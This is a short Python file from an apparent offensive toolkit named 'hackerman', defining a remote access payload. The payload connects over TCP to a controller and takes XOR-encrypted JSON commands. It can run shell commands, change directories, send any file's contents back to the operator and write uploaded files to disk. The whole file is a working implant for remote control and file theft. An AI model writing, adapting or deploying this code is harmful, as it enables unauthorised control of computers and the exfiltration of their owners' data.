from hackerman.transport import tcp
from hackerman.crypto import xor
from hackerman import utils
import json, _thread, time

def do_exit():
	time.sleep(5)
	exit(0)

class Payload(object):
	def __init__(self, addr, password):
		self.conn = tcp.Client(addr)
		self.pwd = password

	def run(self):

		while True:
			dat = self.conn.recv()
			dec = xor.decrypt(dat, self.pwd).decode()
			cmd = json.loads(dec)

			res = self.handle(cmd)
			if res == "exit":
				_thread.start_new_thread(do_exit, ( ))
				res = {'res':"quit"}

			dat = json.dumps(res).encode()
			enc = xor.encrypt(dat,self.pwd)
			self.conn.send(enc)

	def handle(self, cmd):
		if cmd['bg']:
			new = cmd
			new['bg'] = False
			_thread.start_new_thread(self.handle, (new, ))
			cmd['res'] = "started in background"
			return cmd

		if cmd['type'] == "cd":
			cmd['res'] = utils.cd(cmd['dir'])
			return cmd
		elif cmd['type'] == "sh":
			cmd['res'] = utils.b64e(utils.sh(cmd['cmd']))
			return cmd
		# elif cmd['type'] == "exec":
		# 	exec(cmd['cmd'])
		# 	cmd['res'] = utils.b64e("exec'd".encode())
			return cmd
		elif cmd['type'] == "dl":
			fd = open(cmd['fn'],"rb").read()
			cmd['res'] = utils.b64e(fd)
			return cmd
		elif cmd['type'] == "ul":
			with open(cmd['fn'],"wb") as f:
				f.write(utils.b64d(cmd['data']))
			cmd['res'] = "ok"
			return cmd
		elif cmd['type'] == "exit":
			return "exit"
		else:
			cmd['res'] = "invalid type: "+cmd['type']
			return cmd
